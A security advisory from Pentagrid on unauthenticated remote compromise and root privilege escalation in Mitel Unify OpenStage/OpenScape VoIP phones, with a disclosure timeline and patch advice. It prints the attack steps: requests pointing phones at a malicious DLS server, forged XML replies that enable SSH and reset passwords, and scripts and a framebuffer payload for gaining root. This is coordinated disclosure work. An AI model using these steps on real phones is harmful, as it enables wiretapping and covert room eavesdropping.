---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-11_remote-code-execution-and-elevation-of-local-privileges-in-mitel-unify-openstage.md
original_filename: 2023-12-11_remote-code-execution-and-elevation-of-local-privileges-in-mitel-unify-openstage.md
title: Remote code execution and elevation of local privileges in Mitel Unify OpenStage
  and OpenScape VoIP phones
category: documents
detected_topics:
- command-injection
- access-control
- api-security
tags:
- imported
- documents
- command-injection
- access-control
- api-security
language: en
raw_sha256: 824c3dc8be604a8028ec798be610f564c02c563aa31b847fc2d9ad48f584b6d8
text_sha256: 83c04b4732e0c956f2c6c2ef9d5376b6f5c2bc811366fa6c553fc8136109dea9
ingested_at: '2026-06-28T07:32:28Z'
sensitivity: unknown
redactions_applied: false
---

# Remote code execution and elevation of local privileges in Mitel Unify OpenStage and OpenScape VoIP phones

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-11_remote-code-execution-and-elevation-of-local-privileges-in-mitel-unify-openstage.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, api-security
- Ingested At: 2026-06-28T07:32:28Z
- Redactions Applied: False
- Raw SHA256: `824c3dc8be604a8028ec798be610f564c02c563aa31b847fc2d9ad48f584b6d8`
- Text SHA256: `83c04b4732e0c956f2c6c2ef9d5376b6f5c2bc811366fa6c553fc8136109dea9`


## Content

---
title: "Remote code execution and elevation of local privileges in Mitel Unify OpenStage and OpenScape VoIP phones"
page_title: "Remote code execution and elevation of local privileges in Mitel Unify OpenStage and OpenScape VoIP phones | Pentagrid AG"
url: "https://www.pentagrid.ch/en/blog/rce-and-local-root-in-openstage-and-openscape-phones/"
final_url: "https://www.pentagrid.ch/en/blog/rce-and-local-root-in-openstage-and-openscape-phones/"
authors: ["Pentagrid (@pentagridsec)"]
programs: ["Mitel (Atos Unify)"]
bugs: ["VoIP", "RCE", "Missing authentication", "MiTM", "Local Privilege Escalation"]
publication_date: "2023-12-11"
added_date: "2024-01-02"
source: "pentester.land/writeups.json"
original_index: 640
---

# [Remote code execution and elevation of local privileges in Mitel Unify OpenStage and OpenScape VoIP phones](.)

Pentagrid AG 

[ 2023-12-08 06:42 (updated 2023-12-11 12:42) ](.)

During a research project, Pentagrid identified multiple vulnerabilities in the OpenStage and OpenScape VoIP phone series. The combination of insecure defaults and implementation weaknesses allows a remote compromise and the elevation of privileges for a network-local attacker on phones with an unhardened default configuration. Compromising a phone does not only allow to wiretap phone calls, but could also be abused to access microphones for listening to rooms. The vulnerabilities affect a wide range of devices. Pentagrid assumes that many small companies don't use a hardened configuration and are likely affected.

OpenStage and OpenScape are a phone series brand originally developed by Siemens. In 2013, Siemens' devision for enterprise communication was rebranded to Unify. Unify was sold to Atos in 2016, a company that is the ["European number one in cybersecurity"](https://unify.com/en/2023/news_2023_01_24/atos-enters-into-exclusive-negotiations-with-mitel). During the coordinated disclosure, Atos sold Unify to Mitel.

OpenStage and OpenScape phones provide an interface, which is named [Work Point Interface (WPI)](https://wiki.unify.com/wiki/OpenStage_WPI). This is a web-based service on the phones, where a client and the WPI exchange XML messages via HTTPS for machine to machine communication. This WPI is accessible via TCP port 8085 on the phone side. If a customer operates a large set of phones, then the the customer likely uses a deployment tool. This is called Deployment Service (DLS) or Deployment Service Light (DLI). Additionally, the phones have a web-based management (WBM) interface on port 80 and 443.

In the default configuration, the Workpoint Interface does not use authentication and the phones do not verify the DLS/DLI. Any deployment tool can connect the phone to send a configuration. The DLS protocol is public and can be found via document sharing platforms under the title "OpenStage / OpenScape Desk Phone IP Provisioning Interface" with the document ID A31003-S2000-R102-16-7620, which was published 2016. This workpoint interface is used here for the initial access. Furthermore, Pentagrid identified local vulnerabilities, which an attacker can use for privilege escalation.

OpenStage and OpenScape phones are Linux-based systems and quite popular in Germany. They are used in banks and public authorities. Getting initial access on OpenStage HFA phones was mentioned [in the Vault 7 leak in 2013](https://wikileaks.org/ciav7p1/cms/page_524426.html).

## Timeline

  * 2023-08-20: Initial contact of Atos Unify via [obso@atos.net](mailto:obso@atos.net).

  * 2023-08-24: Pentagrid provided the preliminary advisory and further details.

  * 2023-08-25: Atos replied that they will work on resolving the issues and inform about the progress.

  * 2023-10-19: Phone call with product security officer about the current status and Atos' adivsory.

  * 2023-10-19: Atos provided a version 0.3 of the advisory to Pentagrid.

  * 2023-10-25: Call with Unify leader of the product managment and product security officer.

  * 2023-11-20: Planned release date according to 90 days period.

  * 2023-11-27: Agreed prolongation of the release date.

  * 2023-12-08: Deferred release date to be in line with the Unify publication.

  * 2023-12-08: Pentagrid published this advisory.

  * 2023-12-08: Unify communicated a delay of the Unify advisory. It is expected for the 2023-12-13.

  * 2023-12-11: Unify publishes [OBSO-2312-01](https://networks.unify.com/security/advisories/OBSO-2312-01.pdf). Updated references to the advisory.

## 1\. Unauthenticated WPI allows enabling Secure Shell and resetting admin password
  
  
  CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, 8.8 High

### Affected Components

Pentagrid identified the following devices and firmware versions to be affected. Please refer to the Unify advisory OBSO-2312-01 for a detailled list of affected devices and firmware versions.

  * Unify OpenStage 40 Version 3.5.21.0000 (Released: 2020-09-21)

  * Unify OpenStage 80 Version 3.3.24.0000 (Released: 2014-10-10)

  * Unify OpenScape 400 Version 1.10.2.0002 (Released: 2023-04-04)

  * Unify OpenScape 400 Version 1.9.5.0002

  * Unify OpenScape 210 Version 2.0.11.0000 (Released: 2023-06-26)

  * Unify OpenScape 210 Version 2.0.9.0001

  * Unify OpenScape 710 Version 2.0.6.0000

  * Unify OpenScape 710 Version 2.0.11.0000

### Summary

By default, the Work Point Interface on the phone does not verify the deployment service and there is no authentication mechanism. Hence, any client implementing a deployment service can connect a phone and change configuration. A remote attacker can enable the Secure Shell feature on the phone by abusing the unauthenticated Workpoint Interface. It is possible to set an attacker-defined password for the admin user, even if there was a password defined. The attacker only has to be in the same network. The WPI is active by default.

### Impact

The attacker is able to set the admin user’s password to a defined valued, enable SSH and is able to connect to the phone as user admin.

### Technical Details

Each phone has a Work Point Interface enabled. It is a remote management interface and this interface is accessible via the phone’s TCP port 8085. The port uses TLS for encryption. A maintenance tool can connect to a phone’s WPI interface and vice versa a phone can connect a DLS server. An attacker can prompt the phone to contact a malicious DLS server. Therefore, an attacker sends a HTTP GET request to the phone’s web interface using this URL format:
  
  
  https://TARGETPHONEIP:443/contact_dls.html/ContactDLS?ContactMe=true&dls_ip_addr=MALICIOUSSERVER&dls_ip_port=MALICIOUSPORT

The web interface on port 80 and 443 is enabled by default. It is also possible to send a plain HTTP GET request to the DLS interface on Port 8085:
  
  
  http://TARGETPHONEIP:8085/contact_dls.html/ContactDLS?ContactMe=true&dls_ip_addr=MALICIOUSSERVER&dls_ip_port=MALICIOUSPORT

The phone then connects to the given DLS server with some configuration information and a nonce value as shown in the following snippet:
  
  
  POST /DeploymentService/LoginService HTTP/1.1
  Host: XXXXXXXX:XXXX
  Cookie: PHPSESSID=g75hrag2ksves20dbar471b8v5; path=/
  Content-Type: text/xml
  Content-Length: 1957
  Connection: close
  
  <?xml version="1.0" encoding="utf-8"?>
  <WorkpointMessage
  xmlns="http://www.siemens.com/DLS"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://www.siemens.com/DLS">
  <Message nonce="D5AFD7A47752175FF354867D94A61AE0" maxItems="-1">
  <ReasonForContact>solicited</ReasonForContact>
  <ItemList>
  <Item name="device-type">OpenScape Desk Phone CP210</Item>
  <Item name="related-device-type">OpenScape Desk Phone CP210</Item>
  <Item name="gigabit-ethernet-enabled">true</Item>
  […]

The malicious DLS server replies with an XML message that prompts the phone to enable SSH. The nonce value sent by the phone must be included in this XML message. Furthermore, the admin user’s password is forced to an attacker-known value, which is possible within the same message. An example for such a message is given below:
  
  
  HTTP/1.0 200 OK
  Content-length: 323
  
  <DLSMessage>
  <Message nonce="7AA535AE3483E8380B9338C733D6A934">
  <Action>WriteItems</Action>
  </Message>
  <ItemList>
  <Item name="ssh-enable">true</Item>
  <Item name="ssh-password">123456</Item>
  <Item name="ssh-timer-connect">10</Item>
  <Item name="ssh-timer-session">60</Item>
  </ItemList>
  </DLSMessage>

The figure below illustrates the message flow.

![Message flow between Phone and DLS.](../../../images/202312_unify_message_flow.png)

The attacker can now connect to the phone via a secure shell as an admin user with the password 123456. No authentication was needed to get here.
  
  
  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oMACs=+hmac-sha1 admin@PHONEIP

In the OpenStage 80 version 2.2.47.0000 it was not possible to enable SSH directly. But using the malicious DLS server an attacker can change the admin password for the web interface of the phone if it was changed from the default password 123456. The process is similar to enabling SSH as seen above, but the content of the item list in the response of the DLS server needs to be changed to the following line.
  
  
  <Item name="admin-pwd">123456</Item>

Alternatively, an attacker could factory reset the phone via DLS to reset the admin password to 123456 automatically. Therefore, the attacker sends this message as response of the DLS server:
  
  
  HTTP/1.0 200 OK
  Content-length: 244
  
  <DLSMessage>
  <Message nonce="7AA535AE3483E8380B9338C733D6A934">
  <Action>Restart</Action>
  </Message>
  <ItemList>
  <Item name="restart-password">124816</Item>
  <Item name="restart-type">FactoryReset</Item>
  </ItemList>
  </DLSMessage>

Within this message, a factory reset password must be included in the message. It is a [documented and publicly known](https://wiki.unify.com/wiki/OpenScape_Desk_Phone_CP_FAQ) value. A factory reset will reboot the phone.

Having admin access to the web interface, an attacker can now enable SSH as well. If the web interface was disabled, it can be reenabled via a malicious DLS message using the following item.
  
  
  <Item name="enable-WBM">True</Item>

### Precondition

An attacker needs access to the local network and must be able to connect the WPI interface. The phone does not verify the DLS server.

## 2\. Phone does not verify TLS certificate of DLS server per default
  
  
  CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N, 4.3 Medium

### Affected Components

Pentagrid identified the following devices and firmware versions to be affected. Please refer to the Unify advisory OBSO-2312-01 for a detailled list of affected devices and firmware versions.

  * Unify OpenStage 40 Version 3.5.21.0000 (Released: 2020-09-21)

  * Unify OpenStage 80 Version 3.3.24.0000 (Released: 2014-10-10)

  * Unify OpenScape 400 Version 1.10.2.0002 (Released: 2023-04-04)

  * Unify OpenScape 210 Version 2.0.11.0000 (Released: 2023-06-26)

  * Unify OpenScape 710 Version 2.0.6.0000

  * Unify OpenScape 710 Version 2.0.11.0000

### Summary

The phone does not verify the TLS certificate when connecting to the DLS server, with standard settings.

### Impact

This allows man-in-the-middle attackers to spoof a DLS connection. An attackers could also host their own DLS server with an arbitrary certificate. The phone connects to a malicous DLS server and accepts configuration.

### Technical Details

During the analysis it has been observed that the phone connects to DLS server, even if the server does not use a certificate that is signed by a trusted certificate authority. Instead, self-signed certificates are accepted. The phone’s debug log in `/tmp/logs/messages` even logs that it is accepting the certificate.
  
  
  SvcConfig: Certificate verification error (9:certificate is not yet valid) at depth (0), ssl (0x9c2028)
  Sep 29 11:27:34 (none) user.err SvcConfig: Certificate issuer  =C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
  […]
  Sep 29 11:27:34 (none) user.debug SvcConfig: isVerificationSuccessful: caPath =
  Sep 29 11:27:34 (none) user.notice SvcConfig: Allowed HTTPS Not Yet Valid Certificate: /C=AU/ST=Some-State/O=Internet Widgits Pty Ltd
  Sep 29 11:27:34 (none) user.debug SvcConfig: SecureTransportContext::deleteVerifyError for 0x9c2028

The log indicates that certificates is not valid, but allowed.

The phone's web interface defines authentication policies under Security and policies -> Certificates -> Authentication policy, but changing them does not solve the problem described in finding 1 and 2.

### Precondition

An attacker needs to prompt the phone to contact a server without a valid certificate. Therefore, the attacker needs to be in the same network as the VoIP phone.

## 3\. Secure Shell privilege escalation to root via writeable files and directories
  
  
  CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H, 6.7 Medium

### Affected Components

Pentagrid identified the following devices and firmware versions to be affected. Please refer to the Unify advisory OBSO-2312-01 for a detailled list of affected devices and firmware versions.

  * Unify OpenStage 40 Version 3.5.21.0000 (Released: 2020-09-21)

  * Unify OpenStage 80 Version 3.3.24.0000 (Released: 2014-10-10)

  * Unify OpenScape 710 Version 2.0.6.0000

  * Unify OpenScape 710 Version 2.0.11.0000

### Summary

A remote attacker with Secure Shell access as `admin` user is able to abuse improper file permissions to change system-relevant files.

### Impact

An attacker can escalate privileges in order to gain permanent `root` access on the phone.

### Technical Details

For example, the `admin` user has write access to the `/etc/inetd.conf` file and can add a script that gets executed with `root` privileges when the phone starts. In this example, the script `test` was added to the system and written to `/usr/local/bin/`.
  
  
  telnet  stream  tcp  nowait  root  /usr/sbin/telnetd  telnetd
  ftp  stream  tcp  nowait  root  /usr/sbin/ftpd  ftpd
  test  stream  tcp  nowait  root  /usr/local/bin/test  test

The admin user then creates the following executable `/usr/local/bin/test` script. The script changes the `root` user's password and starts the dropbear service without parameters.
  
  
  #!/bin/sh
  /Opera_Deploy/setPasswd.sh root 123456
  /usr/sbin/dropbear

In order to reload the inetd config and execute the test script on connect, the phone needs to reboot. The attacker can use a malicious DLS server as described in finding 1 to send the following response.
  
  
  HTTP/1.0 200 OK
  Content-length: 121
  
  <DLSMessage>
  <Message nonce="7AA535AE3483E8380B9338C733D6A934">
  <Action>Restart</Action>
  </Message>
  </DLSMessage>

After the reboot, the attacker can permanently connect to the phone via SSH as `root`. The regular invocation of the Dropbear SSH server uses the `-w` parameter, which prevents connections for the `root` user, but here the SSH server is started without this restriction.

The following files have improper file permission, which could be used for privilege escalation:

  * `/usr/sbin/stunnel`

  * `/etc/inetd.conf`

Depending on the phone's firmware version, there are more files and directories with problematic file permissions. Further above, the directory `/usr/local/bin/` was mentioned to be writeable by the default shell user `admin`. Files in this directory belong the `admin` user:
  
  
  $ ls -l /usr/local/
  drwxrwxr-x  2 admin  admin  296 Dec 25 02:54 bin
  drwxrwxr-x  2 admin  admin  368 Dec 25 02:54 sbin

Depending on the firmware version and model, the directory `/usr/local/bin/` is part of the `PATH` environment variable and this directory has precedence over other directories, for example on an OpenStage 40 SIP:
  
  
  # id
  uid=0(root) gid=0(root) groups=0(root),10(wheel)
  # echo $PATH
  /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/Opera_Deploy

Another method for the elevation of privileges is to add a file `chpasswd` there, which is then executed on password change. This password change can be triggered with the method from finding 1 and there is no need to reboot the phone.

### Precondition

An attacker needs SSH access to the phone.

## 4\. Writeable framebuffer
  
  
  CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L, 3.4 Low

### Affected Components

Pentagrid identified the following devices and firmware versions to be affected. Please refer to the Unify advisory OBSO-2312-01 for a detailled list of affected devices and firmware versions.

  * Unify OpenScape 400 Version 1.10.2.0002 (Released: 2023-04-04)

  * Unify OpenScape 400 Version 1.9.5.0002

  * Unify OpenScape 210 Version 2.0.11.0000 (Released: 2023-06-26)

  * Unify OpenScape 210 Version 2.0.9.0001

  * Unify OpenScape 710 Version 2.0.6.0000

  * Unify OpenScape 710 Version 2.0.11.0000

### Summary

An attacker with Secure Shell access as the Linux user `admin` is able to write into the framebuffer device.

### Impact

An attacker can change the display content of the phone. Being able to specify the framebuffer content allows crafting specific content for the attack in finding 5.

### Technical Details

Using SSH, the admin user can write arbitrary data into the framebuffer, because the frambuffer device is writeable:
  
  
  $ ls -l /dev/fb0
  crw-rw-rw-  1 root  root  29,  0 Dec 25 04:25 /dev/fb0
  $ echo AAAAAAAAAAAAAAAAAAAA > /dev/fb0

An attacker could show false information on the display with a well-crafted and timed payload.

### Precondition

An attacker needs code execution permission on the phone, for example via SSH access.

## 5\. OpenScape – Secure Shell Privilege escalation to root via SetUID programs
  
  
  CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H, 6.7 Medium

### Affected Components

Pentagrid identified the following devices and firmware versions to be affected. Please refer to the Unify advisory OBSO-2312-01 for a detailled list of affected devices and firmware versions.

  * Unify OpenScape 400 Version 1.10.2.0002 (Released: 2023-04-04)

  * Unify OpenScape 210 Version 2.0.11.0000 (Released: 2023-06-26)

  * Unify OpenScape 710 Version 2.0.6.0000

  * Unify OpenScape 710 Version 2.0.11.0000

### Summary

An attacker with Secure Shell access as `admin` user is able to abuse SetUID permissions to change system-relevant files.

### Impact

An attacker can escalate privileges in order to gain permanent `root` access on the phone.

### Technical Details

The following files have the SUID bit set:

  * `/sbin/fw_printenv`

  * `/Opera_Deploy/appWeb/web/fbshot.exe`

The files are owned by the `root` user and therefore get executed with `root` privileges even when run by the `admin` user.

The `fbshot.exe` creates a screenshot of the display. It takes the content of the framebuffer and creates a BMP file. The `/dev/fb` framebuffer is used as default, but it is possible to specify another framebuffer device as a parameter. As seen in finding 4, the `admin` user can write into `/dev/fb0`. Using the SetUID program `fbshot.exe`, it is possible to overwrite arbitrary files on the system, which has a Denial of Service effect.

While the output files are BMP files in the first place. However, by carefully crafting a buffer, writing the buffer to the framebuffer and using the framebuffer screenshot tool, is is also possible to write files that are more or less valid script files. As long as the attacker-specified code is run, it does not matter if the script fails with a syntax error afterwards, for example due to unbalanced brackets on a line.

Payloads depend on the frambeuffer size and are therefore device-specific. A possible payload for a CP210 is:
  
  
  /home/admin/myscript
  #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)

The attacker creates a file containing this payload, dumps it into the framebuffer and uses the `fbshot.exe`. Because of its SUID bit, even files belonging to the `root` user and a privileged group can be overwritten.
  
  
  cat payload > /dev/fb0 ; /Opera_Deploy/appWeb/web/fbshot.exe /sbin/fw_printenv

The `/sbin/fw_printenv` file is now a BMP file which includes the payload. The program file's flags and ownership is preserved. The file still has the SetUID bit set. With the specific framebuffer content, the BMP is a valid script and will run `/home/admin/myscript`. After a reboot the phone executes the `/sbin/fw_printenv` and in consequence `/home/admin/myscript` as `root`. In order to gain permanent `root` access the `myscript` file can be defined as follows:
  
  
  #!/bin/sh
  /Opera_Deploy/setPasswd.sh root 123456
  dropbear

Using a well-crafted payload and replacing the right files, an attacker might be able to gain `root` access without a proxy `myscript` file and without rebooting.

### Precondition

An attacker needs code execution permission on the phone, for example via SSH access.

## Proof of concept exploit

Pentagrid developed a proof of concept exploit, which is published on [Github](https://github.com/pentagridsec/openstage-exploit-chain).

## Patches and Workaround

Pentagrid recommends to update to a recent firmware version as documented in Unify's advisory [OBSO-2312-01](https://networks.unify.com/security/advisories/OBSO-2312-01.pdf). Furthermore, it is necessary to enable the so-called "secure mode", which activates certificate verification. Just activating all possible certificate checks via the web-based management does not activate the secure mode. It requires to set up a DLS, install a certificate authority, deploy certificates to phones and then to enable the secure mode.

## Credits

These vulnerabilities have been found by Michael Oelke and Martin Schobert (Pentagrid).

  * [Advisory](../../categories/advisory/)
  * [API](../../categories/api/)
  * [Certificate Verification](../../categories/certificate-verification/)
  * [Exploit](../../categories/exploit/)
  * [OpenScape](../../categories/openscape/)
  * [OpenStage](../../categories/openstage/)
  * [Unify](../../categories/unify/)
  * [VoIP](../../categories/voip/)
  * [Vulnerability](../../categories/vulnerability/)

  * [Previous post](../python-mail-libraries-certificate-verification/ "Nothing new, still broken, insecure by default since then: Python's e-mail libraries and certificate verification")
  * [Next post](../multiple-vulnerabilties-in-lantronix-eds-md-iot-gateway/ "Multiple vulnerabilities in Lantronix EDS-MD IoT gateway for medical devices")
